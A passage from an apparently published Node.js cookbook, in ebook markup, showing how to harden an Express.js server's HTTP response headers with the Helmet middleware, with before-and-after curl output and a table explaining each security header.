     <span class="koboSpan" id="kobo.757.1">
      existing hash.
     </span>
    </span>
   </p>
   <h2 id="_idParaDest-281">
    <a id="_idTextAnchor288">
    </a>
    <span class="koboSpan" id="kobo.758.1">
     See also
    </span>
   </h2>
   <ul>
    <li>
     <span class="koboSpan" id="kobo.759.1">
      The
     </span>
     <em class="italic">
      <span class="koboSpan" id="kobo.760.1">
       Implementing authentication with hooks
      </span>
     </em>
     <span class="koboSpan" id="kobo.761.1">
      recipe in
     </span>
     <a href="B19212_06.xhtml#_idTextAnchor178">
      <span class="No-Break">
       <em class="italic">
        <span class="koboSpan" id="kobo.762.1">
         Chapter 6
        </span>
       </em>
      </span>
     </a>
    </li>
    <li>
     <span class="koboSpan" id="kobo.763.1">
      The
     </span>
     <em class="italic">
      <span class="koboSpan" id="kobo.764.1">
       Guarding against cross-site scripting
      </span>
     </em>
     <span class="koboSpan" id="kobo.765.1">
      recipe in
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.766.1">
       this chapter
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.767.1">
      The
     </span>
     <em class="italic">
      <span class="koboSpan" id="kobo.768.1">
       Preventing cross-site request forgery
      </span>
     </em>
     <span class="koboSpan" id="kobo.769.1">
      recipe in
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.770.1">
       this chapter
      </span>
     </span>
    </li>
   </ul>
   <h1 id="_idParaDest-282">
    <a id="_idTextAnchor289">
    </a>
    <span class="koboSpan" id="kobo.771.1">
     Hardening headers with Helmet
    </span>
   </h1>
   <p>
    <span class="koboSpan" id="kobo.772.1">
     Express.js is a lightweight
    </span>
    <a id="_idIndexMarker712">
    </a>
    <span class="koboSpan" id="kobo.773.1">
     web framework, so certain measures that are typically taken to better secure applications are not implemented by the core framework.
    </span>
    <span class="koboSpan" id="kobo.773.2">
     One of the precautionary measures we can take is to set certain security-related HTTP headers on requests.
    </span>
    <span class="koboSpan" id="kobo.773.3">
     Sometimes, this is referred to as
    </span>
    <em class="italic">
     <span class="koboSpan" id="kobo.774.1">
      hardening
     </span>
    </em>
    <span class="koboSpan" id="kobo.775.1">
     the headers of our
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.776.1">
      HTTP requests.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.777.1">
     The
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.778.1">
      Helmet
     </span>
    </strong>
    <span class="koboSpan" id="kobo.779.1">
     module (
    </span>
    <a href="https://github.com/helmetjs/helmet">
     <span class="koboSpan" id="kobo.780.1">
      https://github.com/helmetjs/helmet
     </span>
    </a>
    <span class="koboSpan" id="kobo.781.1">
     ) provides a middleware to set security-related
    </span>
    <a id="_idIndexMarker713">
    </a>
    <span class="koboSpan" id="kobo.782.1">
     headers on our HTTP requests, saving time on manual configuration.
    </span>
    <span class="koboSpan" id="kobo.782.2">
     Helmet sets HTTP headers to reasonable and secure defaults, which can then be extended or customized as needed.
    </span>
    <span class="koboSpan" id="kobo.782.3">
     In this recipe, we’ll learn how to use the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.783.1">
      Helmet module.
     </span>
    </span>
   </p>
   <h2 id="_idParaDest-283">
    <a id="_idTextAnchor290">
    </a>
    <span class="koboSpan" id="kobo.784.1">
     Getting ready
    </span>
   </h2>
   <p>
    <span class="koboSpan" id="kobo.785.1">
     We’ll be extending an Express.js application so that it can use the Helmet module.
    </span>
    <span class="koboSpan" id="kobo.785.2">
     So, first, we must create a basic
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.786.1">
      Express.js server:
     </span>
    </span>
   </p>
   <ol>
    <li>
     <span class="koboSpan" id="kobo.787.1">
      Create a directory named
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.788.1">
       express-helmet
      </span>
     </strong>
     <span class="koboSpan" id="kobo.789.1">
      and initialize the project with
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.790.1">
       npm
      </span>
     </strong>
     <span class="koboSpan" id="kobo.791.1">
      .
     </span>
     <span class="koboSpan" id="kobo.791.2">
      We’ll also install the
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.792.1">
        express
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.793.1">
       module:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.794.1">$ mkdir express-helmet</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.795.1">$ cd express-helmet</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.796.1">$ npm init --yes</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.797.1">$ npm install express</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.798.1">
      Create a file
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.799.1">
       named
      </span>
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.800.1">
        server.js
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.801.1">
       :
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.802.1">$ touch server.js</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.803.1">
      Add the following code
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.804.1">
       to
      </span>
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.805.1">
        server.js
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.806.1">
       :
      </span>
     </span>
     <pre class="source-code"><span class="koboSpan" id="kobo.807.1">
const express = require('express');
const app = express();
app.get('/', (req, res) =&gt; res.send('Hello World!'));
app.listen(3000, () =&gt; {
  console.log('Server listening on port 3000');
});</span></pre>
    </li>
   </ol>
   <p>
    <span class="koboSpan" id="kobo.808.1">
     Now that we’ve
    </span>
    <a id="_idIndexMarker714">
    </a>
    <span class="koboSpan" id="kobo.809.1">
     created our base Express.js application, we’re ready to move on to the steps to complete
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.810.1">
      this recipe.
     </span>
    </span>
   </p>
   <h2 id="_idParaDest-284">
    <a id="_idTextAnchor291">
    </a>
    <span class="koboSpan" id="kobo.811.1">
     How to do it…
    </span>
   </h2>
   <p>
    <span class="koboSpan" id="kobo.812.1">
     In this recipe, we’re going to learn how to use the Helmet module to harden the HTTP headers of our
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.813.1">
      Express.js application:
     </span>
    </span>
   </p>
   <ol>
    <li>
     <span class="koboSpan" id="kobo.814.1">
      First, start the Express.js
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.815.1">
       web server:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.816.1">$ node server.js</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.817.1">
      Now, let’s inspect the headers that our Express.js application returns.
     </span>
     <span class="koboSpan" id="kobo.817.2">
      We can do this using the
     </span>
     <em class="italic">
      <span class="koboSpan" id="kobo.818.1">
       cURL
      </span>
     </em>
     <span class="koboSpan" id="kobo.819.1">
      tool.
     </span>
     <span class="koboSpan" id="kobo.819.2">
      In a second terminal window, enter the
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.820.1">
       following command:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.821.1">$ curl -I http://localhost:3000</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.822.1">
      You should see a response similar to the following that lists the HTTP headers returned on
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.823.1">
       the request:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.824.1">HTTP/1.1 200 OK</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.825.1">X-Powered-By: Express</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.826.1">Content-Type: text/html; charset=utf-8</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.827.1">Content-Length: 12</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.828.1">ETag: W/"c-Lve95gjOVATpfV8EL5X4nxwjKHE"</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.829.1">Date: Mon, 01 Jul 2024 02:19:46 GMT</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.830.1">Connection: keep-alive</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.831.1">Keep-Alive: timeout=5</span></strong></pre>
     <p class="list-inset">
      <span class="koboSpan" id="kobo.832.1">
       Note the
      </span>
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.833.1">
        X-Powered-By:
       </span>
      </strong>
      <span class="No-Break">
       <strong class="source-inline">
        <span class="koboSpan" id="kobo.834.1">
         Express
        </span>
       </strong>
      </span>
      <span class="No-Break">
       <span class="koboSpan" id="kobo.835.1">
        header.
       </span>
      </span>
     </p>
    </li>
    <li>
     <span class="koboSpan" id="kobo.836.1">
      Now, let’s start hardening these headers with the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.837.1">
       helmet
      </span>
     </strong>
     <span class="koboSpan" id="kobo.838.1">
      module.
     </span>
     <span class="koboSpan" id="kobo.838.2">
      Install the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.839.1">
       helmet
      </span>
     </strong>
     <span class="koboSpan" id="kobo.840.1">
      module with the
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.841.1">
       following command:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.842.1">$ npm install helmet</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.843.1">
      We need to import the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.844.1">
       helmet
      </span>
     </strong>
     <span class="koboSpan" id="kobo.845.1">
      middleware in the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.846.1">
       app.js
      </span>
     </strong>
     <span class="koboSpan" id="kobo.847.1">
      file.
     </span>
     <span class="koboSpan" id="kobo.847.2">
      Do this by adding the
     </span>
     <a id="_idIndexMarker715">
     </a>
     <span class="koboSpan" id="kobo.848.1">
      following line just below the
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.849.1">
        express
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.850.1">
       import:
      </span>
     </span>
     <pre class="source-code"><span class="koboSpan" id="kobo.851.1">
const helmet = require('helmet');</span></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.852.1">
      Next, we need to instruct the Express.js application to use the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.853.1">
       helmet
      </span>
     </strong>
     <span class="koboSpan" id="kobo.854.1">
      middleware.
     </span>
     <span class="koboSpan" id="kobo.854.2">
      Below the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.855.1">
       const app = express();
      </span>
     </strong>
     <span class="koboSpan" id="kobo.856.1">
      line, add
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.857.1">
       the following:
      </span>
     </span>
     <pre class="source-code"><span class="koboSpan" id="kobo.858.1">
app.use(helmet());</span></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.859.1">
      Now, restart
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.860.1">
       the server:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.861.1">$ node server.js</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.862.1">
      Send the
     </span>
     <em class="italic">
      <span class="koboSpan" id="kobo.863.1">
       cURL
      </span>
     </em>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.864.1">
       request again:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.865.1">$ curl -I http://localhost:3000</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.866.1">
      At this point, we can
     </span>
     <a id="_idIndexMarker716">
     </a>
     <span class="koboSpan" id="kobo.867.1">
      see that many additional headers are returned on
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.868.1">
       the request:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.869.1">HTTP/1.1 200 OK</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.870.1">Content-Security-Policy: default-src 'self';base-uri 'self';font-src 'self' https: data:;form-action 'self';frame-ancestors 'self';img-src 'self' data:;object-src 'none';script-src 'self';script-src-attr 'none';style-src 'self' https: 'unsafe-inline';upgrade-insecure-requests</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.871.1">Cross-Origin-Opener-Policy: same-origin</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.872.1">Cross-Origin-Resource-Policy: same-origin</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.873.1">Origin-Agent-Cluster: ?1</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.874.1">Referrer-Policy: no-referrer</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.875.1">Strict-Transport-Security: max-age=15552000; includeSubDomains</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.876.1">X-Content-Type-Options: nosniff</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.877.1">X-DNS-Prefetch-Control: off</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.878.1">X-Download-Options: noopen</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.879.1">X-Frame-Options: SAMEORIGIN</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.880.1">X-Permitted-Cross-Domain-Policies: none</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.881.1">X-XSS-Protection: 0</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.882.1">Content-Type: text/html; charset=utf-8</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.883.1">Content-Length: 12</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.884.1">ETag: W/"c-Lve95gjOVATpfV8EL5X4nxwjKHE"</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.885.1">Date: Mon, 01 Jul 2024 02:21:22 GMT</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.886.1">Connection: keep-alive</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.887.1">Keep-Alive: timeout=5</span></strong></pre>
     <p class="list-inset">
      <span class="koboSpan" id="kobo.888.1">
       Note that the
      </span>
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.889.1">
        X-Powered-By
       </span>
      </strong>
      <span class="koboSpan" id="kobo.890.1">
       header has
      </span>
      <span class="No-Break">
       <span class="koboSpan" id="kobo.891.1">
        been removed.
       </span>
      </span>
     </p>
    </li>
   </ol>
   <p>
    <span class="koboSpan" id="kobo.892.1">
     With that, we’ve added the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.893.1">
      helmet
     </span>
    </strong>
    <span class="koboSpan" id="kobo.894.1">
     middleware to our Express.js server and observed the changes it makes to the HTTP headers returned from
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.895.1">
      our request.
     </span>
    </span>
   </p>
   <h2 id="_idParaDest-285">
    <a id="_idTextAnchor292">
    </a>
    <span class="koboSpan" id="kobo.896.1">
     How it works…
    </span>
   </h2>
   <p>
    <span class="koboSpan" id="kobo.897.1">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.898.1">
      helmet
     </span>
    </strong>
    <span class="koboSpan" id="kobo.899.1">
     module configures some of the HTTP headers on our requests based on its security defaults.
    </span>
    <span class="koboSpan" id="kobo.899.2">
     In this recipe, we applied the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.900.1">
      helmet
     </span>
    </strong>
    <span class="koboSpan" id="kobo.901.1">
     middleware to our
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.902.1">
      Express.js server.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.903.1">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.904.1">
      helmet
     </span>
    </strong>
    <span class="koboSpan" id="kobo.905.1">
     module removes the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.906.1">
      X-Powered-By: Express
     </span>
    </strong>
    <span class="koboSpan" id="kobo.907.1">
     header so that discovering the server is Express-based becomes more difficult.
    </span>
    <span class="koboSpan" id="kobo.907.2">
     The reason that we’ve obfuscated this is to protect against attackers trying to exploit Express.js-oriented security vulnerabilities, slowing them down in determining the type of server being used in
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.908.1">
      the application.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.909.1">
     At this point,
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.910.1">
      helmet
     </span>
    </strong>
    <span class="koboSpan" id="kobo.911.1">
     injects
    </span>
    <a id="_idIndexMarker717">
    </a>
    <span class="koboSpan" id="kobo.912.1">
     the following headers into our request, along with the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.913.1">
      appropriate defaults:
     </span>
    </span>
   </p>
   <table class="No-Table-Style _idGenTablePara-1" id="table001-5">
    <colgroup>
     <col/>
     <col/>
    </colgroup>
    <tbody>
     <tr class="No-Table-Style">
      <td class="No-Table-Style">
       <p>
        <span class="No-Break">
         <strong class="bold">
          <span class="koboSpan" id="kobo.914.1">
           Header
          </span>
         </strong>
        </span>
       </p>
      </td>
      <td class="No-Table-Style">
       <p>
        <span class="No-Break">
         <strong class="bold">
          <span class="koboSpan" id="kobo.915.1">
           Description
          </span>
         </strong>
        </span>
       </p>
      </td>
     </tr>
     <tr class="No-Table-Style">
      <td class="No-Table-Style">
       <p>
        <span class="No-Break">
         <strong class="source-inline">
          <span class="koboSpan" id="kobo.916.1">
           Content-Security-Policy
          </span>
         </strong>
        </span>
       </p>
      </td>
      <td class="No-Table-Style">
       <p>
        <span class="koboSpan" id="kobo.917.1">
         Helps mitigate against XSS attacks by allowing a policy to be defined that can control which resources the user agent is allowed
        </span>
        <span class="No-Break">
         <span class="koboSpan" id="kobo.918.1">
          to load
         </span>
        </span>
       </p>
      </td>
     </tr>
     <tr class="No-Table-Style">
      <td class="No-Table-Style">
       <p>
        <span class="No-Break">
         <strong class="source-inline">
          <span class="koboSpan" id="kobo.919.1">
           Cross-Origin-Opener-Policy
          </span>
         </strong>
        </span>
       </p>
      </td>
      <td class="No-Table-Style">
       <p>
        <span class="koboSpan" id="kobo.920.1">
         Ensures that a top-level document can only interact with documents from the
        </span>
        <span class="No-Break">
         <span class="koboSpan" id="kobo.921.1">
          same origin
         </span>
        </span>
       </p>
      </td>
     </tr>
     <tr class="No-Table-Style">
      <td class="No-Table-Style">
       <p>
        <span class="No-Break">
         <strong class="source-inline">
          <span class="koboSpan" id="kobo.922.1">
           Cross-Origin-Resource-Policy
          </span>
         </strong>
        </span>
       </p>
      </td>
      <td class="No-Table-Style">
       <p>
        <span class="koboSpan" id="kobo.923.1">
         Restricts resources so that they can only be accessed by
        </span>
        <span class="No-Break">
         <span class="koboSpan" id="kobo.924.1">
          same-origin documents
         </span>
        </span>
       </p>
      </td>
     </tr>
     <tr class="No-Table-Style">
      <td class="No-Table-Style">
       <p>
        <span class="No-Break">
         <strong class="source-inline">
          <span class="koboSpan" id="kobo.925.1">
           Origin-Agent-Cluster
          </span>
         </strong>
        </span>
       </p>
      </td>
      <td class="No-Table-Style">
       <p>
        <span class="koboSpan" id="kobo.926.1">
         Ensures a document is isolated in a separate agent cluster to prevent data leaks between
        </span>
        <span class="No-Break">
         <span class="koboSpan" id="kobo.927.1">
          different origins
         </span>
        </span>
       </p>
      </td>
     </tr>
     <tr class="No-Table-Style">
      <td class="No-Table-Style">
       <p>
        <span class="No-Break">
         <strong class="source-inline">
          <span class="koboSpan" id="kobo.928.1">
           Referrer-Policy
          </span>
         </strong>
        </span>
       </p>
      </td>
      <td class="No-Table-Style">
       <p>
        <span class="koboSpan" id="kobo.929.1">
         Controls how much referrer information is included with requests sent from
        </span>
        <span class="No-Break">
         <span class="koboSpan" id="kobo.930.1">
          a site
         </span>
        </span>
       </p>
      </td>
     </tr>
     <tr class="No-Table-Style">
      <td class="No-Table-Style">
       <p>
        <span class="No-Break">
         <strong class="source-inline">
          <span class="koboSpan" id="kobo.931.1">
           Strict-Transport-Security
          </span>
         </strong>
        </span>
       </p>
      </td>
      <td class="No-Table-Style">
       <p>
        <span class="koboSpan" id="kobo.932.1">
         Instructs browsers to only allow the website to be accessed
        </span>
        <span class="No-Break">
         <span class="koboSpan" id="kobo.933.1">
          using HTTPS
         </span>
        </span>
       </p>
      </td>
     </tr>
     <tr class="No-Table-Style">
      <td class="No-Table-Style">
       <p>
        <span class="No-Break">
         <strong class="source-inline">
          <span class="koboSpan" id="kobo.934.1">
           X-Content-Type-Options
          </span>
         </strong>
        </span>
       </p>
      </td>
      <td class="No-Table-Style">
       <p>
        <span class="koboSpan" id="kobo.935.1">
         Indicates that the MIME types configured in the
        </span>
        <strong class="source-inline">
         <span class="koboSpan" id="kobo.936.1">
          Content-Type
         </span>
        </strong>
        <span class="koboSpan" id="kobo.937.1">
         headers must be
        </span>
        <span class="No-Break">
         <span class="koboSpan" id="kobo.938.1">
          adhered to
         </span>
        </span>
       </p>
      </td>
     </tr>
     <tr class="No-Table-Style">
      <td class="No-Table-Style">
       <p>
        <span class="No-Break">
         <strong class="source-inline">
          <span class="koboSpan" id="kobo.939.1">
           X-DNS-Prefetch-Control
          </span>
         </strong>
        </span>
       </p>
      </td>
      <td class="No-Table-Style">
       <p>
        <span class="koboSpan" id="kobo.940.1">
         Controls
        </span>
        <span class="No-Break">
         <span class="koboSpan" id="kobo.941.1">
          DNS prefetching
         </span>
        </span>
       </p>
      </td>
     </tr>
     <tr class="No-Table-Style">
      <td class="No-Table-Style">
       <p>
        <span class="No-Break">
         <strong class="source-inline">
          <span class="koboSpan" id="kobo.942.1">
           X-Download-Options
          </span>
         </strong>
        </span>
       </p>
      </td>
      <td class="No-Table-Style">
       <p>
        <span class="koboSpan" id="kobo.943.1">
         Disables the option to open a file
        </span>
        <span class="No-Break">
         <span class="koboSpan" id="kobo.944.1">
          on download
         </span>
        </span>
       </p>
      </td>
     </tr>
     <tr class="No-Table-Style">
      <td class="No-Table-Style">
       <p>
        <span class="No-Break">
         <strong class="source-inline">
          <span class="koboSpan" id="kobo.945.1">
           X-Frame-Options
          </span>
         </strong>
        </span>
       </p>
      </td>
      <td class="No-Table-Style">
       <p>
        <span class="koboSpan" id="kobo.946.1">
         Indicates whether a browser can render a page in a
        </span>
        <strong class="source-inline">
         <span class="koboSpan" id="kobo.947.1">
          &lt;frame&gt;
         </span>
        </strong>
        <span class="koboSpan" id="kobo.948.1">
         ,
        </span>
        <strong class="source-inline">
         <span class="koboSpan" id="kobo.949.1">
          &lt;iframe&gt;
         </span>
        </strong>
        <span class="koboSpan" id="kobo.950.1">
         ,
        </span>
        <strong class="source-inline">
         <span class="koboSpan" id="kobo.951.1">
          &lt;embed&gt;
         </span>
        </strong>
        <span class="koboSpan" id="kobo.952.1">
         , or
        </span>
        <strong class="source-inline">
         <span class="koboSpan" id="kobo.953.1">
          &lt;object&gt;
         </span>
        </strong>
        <span class="No-Break">
         <span class="koboSpan" id="kobo.954.1">
          HTML element
         </span>
        </span>
       </p>
      </td>
     </tr>
     <tr class="No-Table-Style">
      <td class="No-Table-Style">
       <p>
        <span class="No-Break">
         <strong class="source-inline">
          <span class="koboSpan" id="kobo.955.1">
           X-Permitted-Cross-Domain-Policies
          </span>
         </strong>
        </span>
       </p>
      </td>
      <td class="No-Table-Style">
       <p>
        <span class="koboSpan" id="kobo.956.1">
         Instructs the browser on how to handle requests over
        </span>
        <span class="No-Break">
         <span class="koboSpan" id="kobo.957.1">
          a cross-domain
         </span>
        </span>
       </p>
      </td>
     </tr>
     <tr class="No-Table-Style">
      <td class="No-Table-Style">
       <p>
        <span class="No-Break">
         <strong class="source-inline">
          <span class="koboSpan" id="kobo.958.1">
           X-XSS-Protection
          </span>
         </strong>
        </span>
       </p>
      </td>
      <td class="No-Table-Style">
       <p>
        <span class="koboSpan" id="kobo.959.1">
         Instructs the browser to stop page loading when a reflected XSS attack
        </span>
        <span class="No-Break">
         <span class="koboSpan" id="kobo.960.1">
          is detected
         </span>
        </span>
       </p>
      </td>
     </tr>
    </tbody>
   </table>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.961.1">
     Table 9.1: HTTP headers injected by Helmet and their use
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.962.1">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.963.1">
      helmet
     </span>
    </strong>
    <span class="koboSpan" id="kobo.964.1">
     module sets the injected HTTP headers to sensible secure defaults.
    </span>
    <span class="koboSpan" id="kobo.964.2">
     However, they can be
    </span>
    <a id="_idIndexMarker718">
    </a>
    <span class="koboSpan" id="kobo.965.1">
     customized.
    </span>
    <span class="koboSpan" id="kobo.965.2">
     For example, you could manually set the value of
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.966.1">
      Referrer-Policy
     </span>
    </strong>
    <span class="koboSpan" id="kobo.967.1">
     to the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.968.1">
      no-referrer
     </span>
    </strong>
    <span class="koboSpan" id="kobo.969.1">
     header using the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.970.1">
      following code:
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.971.1">
app.use(
  helmet({
    referrerPolicy: { policy: 'no-referrer' },
  })
);</span></pre>
   <p>
    <span class="koboSpan" id="kobo.972.1">
     Additional HTTP headers can also be set using the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.973.1">
      helmet
     </span>
    </strong>
    <span class="koboSpan" id="kobo.974.1">
     module.
    </span>
    <span class="koboSpan" id="kobo.974.2">
     For more information, please refer to the Helmet
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.975.1">
      documentation (
     </span>
    </span>
    <a href="https://helmetjs.github.io/">
     <span class="No-Break">
      <span class="koboSpan" id="kobo.976.1">
       https://helmetjs.github.io/
      </span>
     </span>
    </a>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.977.1">
      ).
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.978.1">
     Some other popular
    </span>
    <a id="_idIndexMarker719">
    </a>
    <span class="koboSpan" id="kobo.979.1">
     web frameworks can also
    </span>
    <a id="_idIndexMarker720">
    </a>
    <span class="koboSpan" id="kobo.980.1">
     integrate
    </span>
    <a id="_idIndexMarker721">
    </a>
    <span class="koboSpan" id="kobo.981.1">
     the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.982.1">
      helmet
     </span>
    </strong>
    <span class="koboSpan" id="kobo.983.1">
     middleware via the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.984.1">
      following modules:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <span class="No-Break">
      <strong class="bold">
       <span class="koboSpan" id="kobo.985.1">
        Koa.js
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.986.1">
       :
      </span>
     </span>
     <a href="https://www.npmjs.com/package/koa-helmet">
      <span class="No-Break">
       <span class="koboSpan" id="kobo.987.1">
        https://www.npmjs.com/package/koa-helmet
       </span>
      </span>
     </a>
    </li>
    <li>
     <span class="No-Break">
      <strong class="bold">
       <span class="koboSpan" id="kobo.988.1">
        Fastify
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.989.1">
       :
      </span>
     </span>
     <a href="https://www.npmjs.com/package/@fastify/helmet">
      <span class="No-Break">
       <span class="koboSpan" id="kobo.990.1">
        https://www.npmjs.com/package/@fastify/helmet
       </span>
      </span>
     </a>
    </li>
   </ul>
   <h2 id="_idParaDest-286">
    <a id="_idTextAnchor293">
    </a>
    <span class="koboSpan" id="kobo.991.1">
     There’s more…
    </span>
   </h2>
   <p>
    <span class="koboSpan" id="kobo.992.1">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.993.1">
      helmet
     </span>
    </strong>
    <span class="koboSpan" id="kobo.994.1">
     middleware
    </span>
    <a id="_idIndexMarker722">
    </a>
    <span class="koboSpan" id="kobo.995.1">
     simply modifies the response headers to appropriate defaults.
    </span>
    <span class="koboSpan" id="kobo.995.2">
     To demonstrate what
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.996.1">
      helmet
     </span>
    </strong>
    <span class="koboSpan" id="kobo.997.1">
     is doing under the covers, we can try injecting the same HTTP headers using the Node.js core
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.998.1">
       http
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.999.1">
      module:
     </span>
    </span>
   </p>
   <ol>
    <li>
     <span class="koboSpan" id="kobo.1000.1">
      Create a folder called
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1001.1">
       http-app
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1002.1">
      and create a
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.1003.1">
        server.js
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1004.1">
       file:
      </span>
     </span>
